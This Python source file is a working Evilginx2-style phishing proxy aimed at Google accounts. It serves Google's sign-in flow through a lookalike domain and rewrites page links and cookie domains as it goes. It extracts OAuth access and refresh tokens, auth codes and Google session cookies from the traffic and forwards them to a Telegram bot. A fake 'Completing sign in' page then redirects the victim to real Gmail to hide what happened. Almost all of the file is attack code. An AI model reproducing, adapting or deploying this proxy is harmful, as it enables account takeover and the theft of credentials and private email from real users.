#!/usr/bin/env python3
"""
Evilginx2-Style AiTM Proxy for Gmail OAuth Interception
Transparently proxies accounts.google.com, captures tokens and session cookies
No Google verification warnings - victim authenticates with real Google
"""

import asyncio
import aiohttp
from aiohttp import web
import re
import json
import os
import logging
from datetime import datetime
import time
import ssl

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

# ===== CONFIGURATION =====
PROXY_DOMAIN = 'ivview.party'  # Your domain
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')

# Google domain -> Proxy domain mapping
DOMAIN_MAP = {
    'accounts.google.com':     f'accounts.{PROXY_DOMAIN}',
    'accounts.youtube.com':    f'accounts.{PROXY_DOMAIN}',
    'ssl.gstatic.com':         f'ssl.{PROXY_DOMAIN}',
    'www.gstatic.com':         f'sl.{PROXY_DOMAIN}',
    'apis.google.com':         f'apis.{PROXY_DOMAIN}',
    'play.google.com':         f'play.{PROXY_DOMAIN}',
    'myaccount.google.com':    f'myaccount.{PROXY_DOMAIN}',
    'content.googleapis.com':  f'content.{PROXY_DOMAIN}',
    'www.google.com':          f'www.{PROXY_DOMAIN}',
    'google.com':              PROXY_DOMAIN,
    'accounts.google.bg':      f'accounts.{PROXY_DOMAIN}',
    'mail.google.com':         f'mail.{PROXY_DOMAIN}',
    'accounts.google.co.uk':   f'accounts.{PROXY_DOMAIN}',
}

REVERSE_MAP = {v: k for k, v in DOMAIN_MAP.items()}

# Cookie domain rewrites
COOKIE_MAP = {
    '.google.com':         f'.{PROXY_DOMAIN}',
    'google.com':          PROXY_DOMAIN,
    '.accounts.google.com': f'.accounts.{PROXY_DOMAIN}',
    '.mail.google.com':    f'.mail.{PROXY_DOMAIN}',
}

# Hop-by-hop headers to strip
HOP_BY_HOP = {'host', 'connection', 'keep-alive', 'proxy-authenticate',
              'proxy-authorization', 'te', 'trailers', 'transfer-encoding',
              'upgrade', 'content-length', 'content-encoding'}

# ===== CAPTURED DATA =====
captures = []

# ===== TELEGRAM =====
async def tg(msg):
    if not TELEGRAM_BOT_TOKEN:
        logger.info(f"[TG] {msg[:200]}")
        return
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    async with aiohttp.ClientSession() as s:
        try:
            await s.post(url, json={'chat_id': TELEGRAM_CHAT_ID, 'text': msg, 'parse_mode': 'HTML'})
        except: pass

async def tg_file(name, data):
    if not TELEGRAM_BOT_TOKEN:
        return
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument'
    async with aiohttp.ClientSession() as s:
        try:
            fd = aiohttp.FormData()
            fd.add_field('chat_id', TELEGRAM_CHAT_ID)
            fd.add_field('document', data, filename=name)
            await s.post(url, data=fd)
        except: pass

# ===== CONTENT REWRITING =====
def rewrite_url(url_str, base=None):
    """Rewrite any URL from Google domain to proxy domain"""
    if not url_str or url_str.startswith('data:') or url_str.startswith('javascript:'):
        return url_str
    
    # Handle protocol-relative URLs
    if url_str.startswith('//'):
        url_str = 'https:' + url_str
    
    # Handle relative URLs
    if url_str.startswith('/') and base:
        from urllib.parse import urlparse
        bp = urlparse(base)
        url_str = f'{bp.scheme}://{bp.netloc}{url_str}'
    
    # Replace all known Google domains
    result = url_str
    for gd, pd in DOMAIN_MAP.items():
        result = result.replace(f'https://{gd}', f'https://{pd}')
        result = result.replace(f'http://{gd}', f'https://{pd}')
        result = result.replace(f'//{gd}', f'//{pd}')
    
    return result

def rewrite_html(content, base_url):
    """Rewrite HTML/JS content replacing Google references"""
    if not content:
        return content
    
    text = content.decode('utf-8', errors='replace') if isinstance(content, bytes) else content
    
    # Replace all domain references in content
    for gd, pd in DOMAIN_MAP.items():
        text = text.replace(gd, pd)
    
    return text.encode('utf-8')

# ===== TOKEN EXTRACTION =====
def extract_tokens(text):
    """Extract OAuth tokens and cookies from response"""
    results = {}
    text_str = text.decode('utf-8', errors='replace') if isinstance(text, bytes) else text
    
    # OAuth tokens
    for pattern, key in [
        (r'"access_token"\s*:\s*"([^"]+)"', 'access_token'),
        (r'"refresh_token"\s*:\s*"([^"]+)"', 'refresh_token'),
        (r'"id_token"\s*:\s*"([^"]+)"', 'id_token'),
        (r'access_token=([^&\s]+)', 'access_token_url'),
        (r'code=([^&\s]+)', 'auth_code'),
        (r'"scope"\s*:\s*"([^"]+)"', 'scope'),
        (r'"token_type"\s*:\s*"([^"]+)"', 'token_type'),
        (r'"expires_in"\s*:\s*(\d+)', 'expires_in'),
    ]:
        m = re.search(pattern, text_str)
        if m:
            results[key] = m.group(1)
    
    # Session cookies in Set-Cookie headers
    cookie_patterns = [
        (r'SID=([^;]+)', 'SID'),
        (r'HSID=([^;]+)', 'HSID'),
        (r'SSID=([^;]+)', 'SSID'),
        (r'APISID=([^;]+)', 'APISID'),
        (r'SAPISID=([^;]+)', 'SAPISID'),
        (r'LSID=([^;]+)', 'LSID'),
        (r'__Secure-3PSID=([^;]+)', '__Secure-3PSID'),
        (r'__Secure-3PAPISID=([^;]+)', '__Secure-3PAPISID'),
        (r'__Secure-3PPSID=([^;]+)', '__Secure-3PPSID'),
        (r'__Secure-3PHSID=([^;]+)', '__Secure-3PHSID'),
        (r'SIDCC=([^;]+)', 'SIDCC'),
        (r'__Secure-1PSID=([^;]+)', '__Secure-1PSID'),
        (r'__Secure-1PAPISID=([^;]+)', '__Secure-1PAPISID'),
        (r'NID=([^;]+)', 'NID'),
    ]
    
    cookies = {}
    for pattern, name in cookie_patterns:
        m = re.search(pattern, text_str)
        if m:
            cookies[name] = m.group(1)
    
    if cookies:
        results['cookies'] = cookies
    
    return results

# ===== PROXY HANDLER =====
async def proxy_handler(request):
    """Main handler - proxies all requests through to Google, rewrites on the fly"""
    path = request.match_info.get('path', '')
    host = request.headers.get('Host', '').split(':')[0]
    
    # Determine target Google host
    target_host = REVERSE_MAP.get(host)
    if not target_host:
        # Try to find by suffix match
        for pd, gd in REVERSE_MAP.items():
            if host.endswith('.' + pd):  # e.g., accounts.ivview.party
                # Extract subdomain
                sub = host[:-len('.' + pd)]
                target_host = f'{sub}.{gd}' if '.' in gd else f'{sub}.{gd}'
                break
        if not target_host:
            target_host = 'accounts.google.com'
    
    qs = request.query_string
    target = f'https://{target_host}{path}'
    if qs:
        target += f'?{qs}'
    
    logger.info(f">> {request.method} {host}{path} -> {target}")
    
    # Build request headers
    headers = {k: v for k, v in request.headers.items() if k.lower() not in HOP_BY_HOP}
    headers['Host'] = target_host
    
    # Body
    body = await request.read() if request.can_read_body else None
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.request(
                request.method, target,
                headers=headers, data=body,
                allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as resp:
                
                resp_body = await resp.read()
                ct = resp.headers.get('Content-Type', '')
                
                # ===== CAPTURE: Check for OAuth tokens in body =====
                tokens_found = extract_tokens(resp_body)
                if tokens_found:
                    capture = {
                        'time': datetime.now().isoformat(),
                        'target': target,
                        **tokens_found
                    }
                    captures.append(capture)
                    
                    msg = f"🎯 <b>TOKENS CAPTURED</b>\n\n"
                    if 'access_token' in capture:
                        at = capture['access_token']
                        msg += f"<b>Access Token:</b>\n<code>{at[:60]}...</code>\n"
                    if 'refresh_token' in capture:
                        msg += f"<b>Refresh Token:</b>\n<code>{capture['refresh_token'][:60]}...</code>\n"
                    if 'auth_code' in capture:
                        msg += f"<b>Auth Code:</b>\n<code>{capture['auth_code'][:60]}...</code>\n"
                    if 'cookies' in capture:
                        msg += f"\n<b>Session Cookies:</b> {len(capture['cookies'])} found\n"
                    if 'scope' in capture:
                        msg += f"\n<b>Scope:</b> <code>{capture['scope']}</code>\n"
                    msg += f"\n<b>Time:</b> {capture['time']}"
                    
                    asyncio.ensure_future(tg(msg))
                    asyncio.ensure_future(tg_file(
                        f'token_{int(time.time())}.json',
                        json.dumps(capture, indent=2).encode()
                    ))
                
                # ===== HANDLE REDIRECTS =====
                if resp.status in (301, 302, 303, 307, 308):
                    loc = resp.headers.get('Location', '')
                    if loc:
                        new_loc = rewrite_url(loc, target)
                        
                        # Check redirect for tokens
                        if 'code=' in loc or 'access_token=' in loc:
                            cap = {'time': datetime.now().isoformat(), 'redirect': loc}
                            captures.append(cap)
                            asyncio.ensure_future(tg(
                                f"🔀 <b>OAuth Redirect Captured</b>\n\n<code>{loc[:500]}</code>"
                            ))
                        
                        return web.Response(status=resp.status, headers={'Location': new_loc})
                
                # ===== BUILD RESPONSE =====
                resp_headers = {}
                for k, v in resp.headers.items():
                    kl = k.lower()
                    if kl not in HOP_BY_HOP and kl not in ('content-length', 'content-encoding'):
                        resp_headers[k] = v
                
                # Rewrite cookies
                if 'Set-Cookie' in resp.headers:
                    new_cookies = []
                    for c in resp.headers.getall('Set-Cookie', []):
                        nc = c
                        for gd, pd in COOKIE_MAP.items():
                            nc = nc.replace(gd, pd)
                        new_cookies.append(nc)
                    resp_headers['Set-Cookie'] = ', '.join(new_cookies)
                    
                    # Also check for cookies in this response
                    cookie_cap = extract_tokens('\n'.join(new_cookies).encode())
                    if cookie_cap.get('cookies'):
                        cap = {'time': datetime.now().isoformat(), 'source': 'set-cookie', **cookie_cap}
                        captures.append(cap)
                        asyncio.ensure_future(tg(
                            f"🍪 <b>Session Cookies Captured</b>\n\n" +
                            '\n'.join(f"<code>{k}={v[:30]}...</code>" for k,v in cookie_cap['cookies'].items())
                        ))
                
                # Rewrite body content (HTML/JS/JSON)
                should_rewrite = any(t in ct for t in ['text/html', 'javascript', 'json', 'text/css', 'xml'])
                if should_rewrite:
                    resp_body = rewrite_html(resp_body, target)
                
                return web.Response(
                    status=resp.status,
                    headers=resp_headers,
                    body=resp_body
                )
    
    except Exception as e:
        logger.error(f"Proxy error: {e}")
        return web.Response(status=502, text=f'Proxy Error: {e}')

# ===== CALLBACK HANDLER =====
async def oauth_callback(request):
    """Handle the OAuth callback redirect - capture auth code"""
    code = request.query.get('code', '')
    state = request.query.get('state', '')
    scope = request.query.get('scope', '')
    
    if code:
        cap = {'time': datetime.now().isoformat(), 'auth_code': code, 'state': state, 'scope': scope}
        captures.append(cap)
        
        msg = f"📥 <b>OAuth Callback!</b>\n\n<b>Code:</b>\n<code>{code}</code>\n<b>State:</b> {state}\n<b>Scope:</b> {scope}"
        asyncio.ensure_future(tg(msg))
    
    # Redirect victim to real Gmail
    html = """<!DOCTYPE html>
<html><head><title>Redirecting...</title>
<style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f0f0f0}
.card{background:white;padding:40px;border-radius:12px;text-align:center}
.spinner{border:4px solid #e0e0e0;border-top:4px solid #1a73e8;border-radius:50%;width:40px;height:40px;animation:s 1s linear infinite;margin:20px auto}
@keyframes s{to{transform:rotate(360deg)}}</style></head>
<body><div class="card"><h2>Completing sign in...</h2><div class="spinner"></div><p>Redirecting to Gmail</p></div>
<script>setTimeout(function(){window.location.href='https://mail.google.com'},2000)</script></body></html>"""
    return web.Response(text=html, content_type='text/html')

# ===== STATUS =====
async def status(request):
    return web.json_response({
        'captures': len(captures),
        'uptime': time.time() - start_time
    })

# ===== MAIN =====
start_time = time.time()
app = web.Application()
app.router.add_route('*', '/oauth/callback', oauth_callback)
app.router.add_route('GET', '/status', status)
app.router.add_route('GET', '/', lambda r: web.HTTPFound(f'https://{PROXY_DOMAIN}'))
app.router.add_route('*', '/{path:.*}', proxy_handler)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    logger.info(f"AiTM Proxy running on :{port}")
    logger.info(f"Proxying accounts.google.com through accounts.{PROXY_DOMAIN}")
    web.run_app(app, host='0.0.0.0', port=port)